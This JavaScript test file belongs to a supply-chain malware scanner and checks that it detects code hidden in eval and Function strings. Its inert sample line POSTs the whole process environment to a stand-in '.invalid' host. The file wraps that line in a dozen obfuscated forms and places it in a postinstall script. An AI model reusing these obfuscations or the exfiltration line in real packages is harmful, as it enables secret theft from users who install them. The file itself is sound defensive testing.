// EVAL-LITERAL (0.1.9): the code a text hands an eval call as a string is read as code. `eval("…")`,
// `new Function("…")`, `Function("…")` and a global object's eval or Function by a name the text computes
// (`globalThis["ev" + "al"]("…")`) run the string they are handed; the import-time and install-script tests read it as
// a string, so a send written inside one was quiet (found and first fixed by the external review agent, card 609dd639,
// Oct 21–22). Each such string is now read by the same test as a text of its own, and what it finds is given at the
// call's line, noted " (in a string it runs as code)"; strings in strings are read four deep, and a text that nests
// them deeper is SC-TRUNCATED, never quiet. Twin of python/tests/registry/test_eval_literal_code.py and of the engine's
// evalcode_tests.rs. Inert text only: nothing is executed; the addresses are .invalid.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { spawnSync } from "node:child_process";
import { importTimeRisk, installScriptRisk, NativeExhausted, exhaustedWhy } from "../src/lib/native.js";
import { depFileIssues } from "../src/deps.js";

const CLI = join(dirname(fileURLToPath(import.meta.url)), "..", "bin", "lazaret.js");
const HARVEST = "reads credentials or the whole environment and sends data over the network";
const NOTE = " (in a string it runs as code)";
const SEND = 'fetch("https://c.invalid/x", { method: "POST", body: JSON.stringify(process.env) });';
const HEAD = "const path = require('path');\nmodule.exports = path.join('a', 'b');\n";
const WORDS = "the strings eval calls run as code are read 4 deep (_EVAL_DEPTH), and this text nests them deeper";

/** `code` as a string literal in quote `q`. */
const lit = (code, q = "'") => q + code.replaceAll("\\", "\\\\").replaceAll("\n", "\\n").replaceAll(q, "\\" + q) + q;
/** `code` run by `depth` evals, one in another's string. */
function nested(code, depth) {
  for (let k = 0; k < depth; k++) code = `eval(${lit(code, k % 2 === 0 ? '"' : "'")});`;
  return code;
}

const HALF = SEND.indexOf("{ method");
const FORMS = {
  "eval, escaped quotes": `eval(${lit(SEND, '"')});`,
  "eval, a template with no holes": `eval(\`${SEND}\`);`,
  "eval, \\x and \\u escapes": 'eval("' + SEND.replace("fetch", "\\x66etch").replace("process", "\\u0070rocess")
    .replaceAll('"', '\\"') + '");',
  "eval, literals joined": `eval(${lit(SEND.slice(0, HALF))} + ${lit(SEND.slice(HALF), '"')});`,
  "new Function": `new Function(${lit(SEND)})();`,
  "Function": `Function(${lit(SEND)})();`,
  "new Function, parameters first": `new Function('require', ${lit(SEND)})(require);`,
  'globalThis["ev" + "al"]': `globalThis["ev" + "al"](${lit(SEND)});`,
  'window["eval"]': `window["eval"](${lit(SEND)});`,
  "self[`Func` + `tion`]": `self[\`Func\` + \`tion\`](${lit(SEND)})();`,
  "(0, eval)": `(0, eval)(${lit(SEND)});`,
  "eval in eval": nested(SEND, 2),
};

/** A --deps scan (the CLI's) of a project whose dependency `x` has `index.js` and whose dependency `y` runs
 * `install.js` when it is installed: its report's issues. */
function depsScan(text) {
  const root = mkdtempSync(join(tmpdir(), "lz-evallit-"));
  const out = mkdtempSync(join(tmpdir(), "lz-evallit-out-"));
  try {
    const files = { "package.json": '{"name": "app", "version": "1.0.0"}\n',
      "node_modules/x/package.json": '{"name": "x", "version": "1.0.0"}\n', "node_modules/x/index.js": text,
      "node_modules/y/package.json": '{"name": "y", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}\n',
      "node_modules/y/install.js": text };
    for (const [rel, data] of Object.entries(files)) {
      const path = join(root, ...rel.split("/"));
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, data, "utf8");
    }
    spawnSync(process.execPath, [CLI, root, "--out-dir", out, "-q", "--deps"], { encoding: "utf8" });
    return JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8")).issues;
  } finally {
    rmSync(root, { recursive: true, force: true });
    rmSync(out, { recursive: true, force: true });
  }
}

test("each form is found at its call's line, by the import-time and the install-script tests", () => {
  const plain = installScriptRisk(SEND + "\n", true, false, "js");
  assert.ok(plain.length > 0);
  for (const [name, form] of Object.entries(FORMS)) {
    assert.deepEqual(importTimeRisk(HEAD + form + "\n", "js"), [[HARVEST + NOTE], 3], name);
    assert.deepEqual(installScriptRisk(HEAD + form + "\n", true, false, "js"), plain.map((r) => r + NOTE), name);
  }
});

test("a string no call runs is still a string; benign strings run as code are quiet", () => {
  assert.deepEqual(importTimeRisk(`const s = ${lit(SEND)};\nmodule.exports = s;\n`, "js"), [[], null]);
  assert.deepEqual(importTimeRisk(`// eval(${lit(SEND)})\n`, "js"), [[], null]);
  for (const code of ['eval("1+1");', 'new Function("a", "b", "return a+b");', 'var g = Function("return this")();',
    "var o = eval(\"(\" + '{\"a\": 1, \"b\": [true, null]}' + \")\");",
    "var lib = new Function(\"exports\", \"var a=function(b){return b*2};exports.a=a;\");"]) {
    assert.deepEqual(importTimeRisk(code, "js"), [[], null], code);
    assert.deepEqual(installScriptRisk(code, true, false, "js"), [], code);
  }
});

test("--deps: the dependency's file and its install script", () => {
  const issues = depsScan(HEAD + FORMS['globalThis["ev" + "al"]'] + "\n");
  const got = issues.filter((i) => i.rule === "SC-IMPORT-RISK" || i.rule === "SC-INSTALL-HOOK")
    .map((i) => [i.rule, i.file.replaceAll("\\", "/"), i.sev, i.line]).sort();
  assert.deepEqual(got.map(([r, f, s]) => [r, f, s]), [["SC-IMPORT-RISK", "node_modules/x/index.js", "CRITICAL"],
    ["SC-INSTALL-HOOK", "node_modules/y/package.json", "CRITICAL"]]);
  assert.equal(got[0][3], 3);
});

test("strings in strings: four deep are read, deeper is SC-TRUNCATED", () => {
  assert.deepEqual(importTimeRisk(nested(SEND, 4), "js"), [[HARVEST + NOTE], 1]);
  const deep = nested(SEND, 5);
  // asked plainly, the engine's call answers as one that ran out, its error in the bound's words
  assert.throws(() => importTimeRisk(deep, "js"), (e) => e instanceof NativeExhausted && e.message === WORDS && exhaustedWhy(e) === WORDS);
  // the dependency check's: SC-TRUNCATED beside what was found (nothing)
  const [found, , cut] = depFileIssues("node_modules/x/index.js", deep, "js");
  assert.equal(found, null);
  assert.deepEqual([cut.rule, cut.sev], ["SC-TRUNCATED", "CRITICAL"]);
  assert.ok(cut.msg.includes(WORDS), cut.msg);
});

test("a text that ends inside the call is read", () => {
  for (const text of ["eval(", 'eval("', "eval('a' +", "new Function('a', ", 'globalThis["ev" + ', "window['eval'](", "eval(\n"]) {
    assert.deepEqual(importTimeRisk(text, "js"), [[], null], text);
    assert.deepEqual(installScriptRisk(text, true, false, "js"), [], text);
  }
  for (const text of ["exec(", "exec('a'", "getattr(builtins, 'exec')(", "exec('''"]) {
    assert.deepEqual(importTimeRisk(text, "py"), [[], null], text);
  }
});
